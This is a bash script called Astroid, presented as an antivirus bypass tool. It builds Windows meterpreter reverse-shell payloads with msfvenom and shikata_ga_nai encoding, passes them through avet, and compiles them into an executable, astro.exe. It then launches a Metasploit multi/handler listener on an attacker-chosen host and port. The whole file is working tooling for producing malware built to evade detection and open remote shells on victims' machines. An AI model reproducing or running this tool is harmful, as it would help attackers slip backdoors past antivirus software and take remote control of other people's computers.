#!/bin/bash
#
# Astroid A.V bypass tool . version 1.0
#
# Generate encoded shellcode with metasploit payloads,decoded by avet then compiled to EXE's
#
#                  Created By Mascerano Bachir .
#                 Website: http://www.dev-labs.co
#           YTB : https://www.youtube.com/c/mascerano%20bachir  
#        FCB : https://www.facebook.com/kali.linux.pentesting.tutorials
#
# this is an open source tool if you want to modify or add something . Please give me a copy.

#Colors
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'

path=`pwd`
shellc="$path/$RANDOM.txt"

# detect ctrl+c exiting
trap ctrl_c INT
ctrl_c() {
clear
echo -e $red"[*] (Ctrl + C ) Detected, Trying To Exit ..."
sleep 1
echo ""
echo -e $yellow"[*] Thanks For Using ASTROID  :)"
exit
}
clear

#banner head
echo -e $blue ""
echo "  █████╗ ███████╗████████╗██████╗  ██████╗ ██╗██████╗ "
echo " ██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗██║██╔══██╗"
echo " ███████║███████╗   ██║   ██████╔╝██║   ██║██║██║  ██║"
echo " ██╔══██║╚════██║   ██║   ██╔══██╗██║   ██║██║██║  ██║"
echo " ██║  ██║███████║   ██║   ██║  ██║╚██████╔╝██║██████╔╝"
echo " ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═════╝ "
echo "        By Mascerano Bachir | version 1.0 [Dev-labs]  "

checkdir="/root/.wine/"
if [ ! -d "$checkdir" ]; then
        echo -e $red "wine not found on this system. Please run setup.sh"
	exit
fi
echo -e $yellow ""
read -p "Choose Your LHOST: " lhst
read -p "Choose Your LPORT: " lprt
clear
echo $bannr
echo -e $red " +-+-+-+-+-+-+-+-+ "
echo -e $red " |p|a|y|l|o|a|d|s| "
echo -e $red " +-+-+-+-+-+-+-+-+ "

echo ""
echo -e $yellow "LHOST set to $lhst and the LPORT is set to $lprt."
echo
echo -e $yellow "Use windows/meterpreter(reverse_x) payloads."
echo ""
echo -e $yellow "example payloads :"
echo ""
echo -e $lightgreen " [_reverse_tcp]"
echo -e $lightgreen " [_reverse_https]"
echo -e $lightgreen " [/reverse_tcp]"
echo -e $lightgreen " [/reverse_https]"
echo -e $lightgreen " [/reverse_winhttps]"
echo ""
echo -e $yellow "Which would you like to use?"
read -p " windows/meterpreter" paylds
echo ""
echo -e $yellow "iterations from 1 to 20"
read -p " How many encoding iterations? " enumber
echo ""
echo -e $yellow "Are you sure?"
read -p " Press any key to continue..."
clear
echo $bannr
echo -e $red "  _   _   _   _   _   _   _   _   "
echo -e $red " / \ / \ / \ / \ / \ / \ / \ / \  "
echo -e $red "( g | e | n | e | r | a | t | e ) "
echo -e $red " \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/  "

echo ""
echo -e $lightgreen "Using $lhst:$lprt"
echo -e $lightgreen "payload windows/meterpreter$paylds. with $enumber iterations"
echo
directory="$path/output"
if [ ! -d "$directory" ]; then
	echo "Creating the output directory..."
	mkdir $directory
fi
if test "$(ls -A "$directory")"; then

	echo " Clean up output directory"
	rm $directory/*
fi
#generate shellcode
echo ""
echo -e $yellow "+++ Generating raw shellcode............ +++"
echo
for i in {0..12}; do
  if ! (($i % 10)); then
    printf "\e[1K\rprocessing"
  else
    printf "."
  fi
  sleep 1
done && printf "\e[2K\r"
msfvenom -p windows/meterpreter${paylds} LHOST=$lhst LPORT=$lprt --platform windows -a x86 -e x86/shikata_ga_nai -i $enumber -f c -o $shellc > /dev/null 2>&1
echo -e $lightcyan "Shellcode generated = $shellc "
echo ""
echo -e $yellow "+++ decoding the shellcode with avet.... +++" 
echo ""
for i in {0..12}; do
  if ! (($i % 10)); then
    printf "\e[1K\rprocessing"
  else
    printf "."
  fi
  sleep 1
done && printf "\e[2K\r"
sudo ./make_avet -f $shellc > /dev/null 2>&1
sleep 2
echo -e $lightcyan "decoded $shellc to defs.h"
echo ""
echo -e $yellow "+++ Compiling to exe.................... +++"
echo ""
for i in {0..12}; do
  if ! (($i % 10)); then
    printf "\e[1K\rprocessing"
  else
    printf "."
  fi
  sleep 1
done && printf "\e[2K\r"
sudo mingw-gcc -o $path/output/astro.exe $path/avet.c -lws2_32 -mwindows > /dev/null 2>&1
sleep 2
echo ""
echo -e $lightcyan "--------------------------------------------------"
echo -e $lightcyan "[*] payload exec generated in output/astro.exe [*]"
echo -e $lightcyan "--------------------------------------------------"
# cleanup
rm $shellc
rm defs.h
echo -e $yellow "" 
while true; do
    read -p "[*] Would you like to start a listener? (Y/n) = " yn
    case $yn in
    [Yy]* ) xterm -T "ASTROID MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $lhst; set LPORT $lprt; set PAYLOAD windows/meterpreter$paylds; set ExitOnSession false; set EnableStageEncoding true; exploit -j -z'";exit;;
    [Nn]* ) echo "";echo "Good Bye!";echo "";exit;;
    esac
done
